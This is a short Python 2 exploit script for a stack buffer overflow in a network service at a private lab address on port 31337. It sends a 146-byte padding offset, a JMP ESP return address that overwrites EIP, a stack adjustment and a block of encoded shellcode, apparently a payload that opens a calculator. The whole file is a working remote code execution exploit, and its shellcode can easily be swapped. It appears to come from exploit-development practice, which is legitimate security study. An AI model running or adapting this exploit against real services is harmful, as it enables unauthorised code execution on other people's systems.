#!/usr/bin/env python2
import socket
import struct

RHOST="192.168.205.170"
RPORT=31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

total = 1024
offset = 146

jmpesp = 0x080414C3
subesp = "\x83\xec\x10"

calc =  ""
calc += "\xba\x17\xe1\xf7\xb0\xd9\xe9\xd9\x74\x24\xf4\x5f\x33"
calc += "\xc9\xb1\x31\x31\x57\x13\x03\x57\x13\x83\xc7\x13\x03"
calc += "\x02\x4c\xf3\x41\xed\xad\x03\x26\x67\x48\x32\x66\x13"
calc += "\x18\x64\x56\x57\x4c\x88\x1d\x35\x65\x1b\x53\x92\x8a"
calc += "\xac\xde\xc4\xa5\x2d\x72\x34\xa7\xad\x89\x69\x07\x8c"
calc += "\x41\x7c\x46\xc9\xbc\x8d\x1a\x82\xcb\x20\x8b\xa7\x86"
calc += "\xf8\x20\xfb\x07\x79\xd4\x4b\x29\xa8\x4b\xc0\x70\x6a"
calc += "\x6d\x05\x09\x23\x75\x4a\x34\xfd\x0e\xb8\xc2\xfc\xc6"
calc += "\xf1\x2b\x52\x27\x3e\xde\xaa\x6f\xf8\x01\xd9\x99\xfb"
calc += "\xbc\xda\x5d\x86\x1a\x6e\x46\x20\xe8\xc8\xa2\xd1\x3d"
calc += "\x8e\x21\xdd\x8a\xc4\x6e\xc1\x0d\x08\x05\xfd\x86\xaf"
calc += "\xca\x74\xdc\x8b\xce\xdd\x86\xb2\x57\xbb\x69\xca\x88"
calc += "\x64\xd5\x6e\xc2\x88\x02\x03\x89\xc6\xd5\x91\xb7\xa4"
calc += "\xd6\xa9\xb7\x98\xbe\x98\x3c\x77\xb8\x24\x97\x3c\x26"
calc += "\xc7\x32\x48\xcf\x5e\xd7\xf1\x92\x60\x0d\x35\xab\xe2"
calc += "\xa4\xc5\x48\xfa\xcc\xc0\x15\xbc\x3d\xb8\x06\x29\x42"
calc += "\x6f\x26\x78\x21\xee\xb4\xe0\x88\x95\x3c\x82\xd4"

buf = ""
buf = "A"*(offset - len(buf))
buf += struct.pack("<I", jmpesp) # EIP
buf += subesp
buf += calc
buf += "F"*(total - len(buf))
buf += "\n"

s.send(buf)

print "Sent: {0}".format(buf)

resp = s.recv(1024)
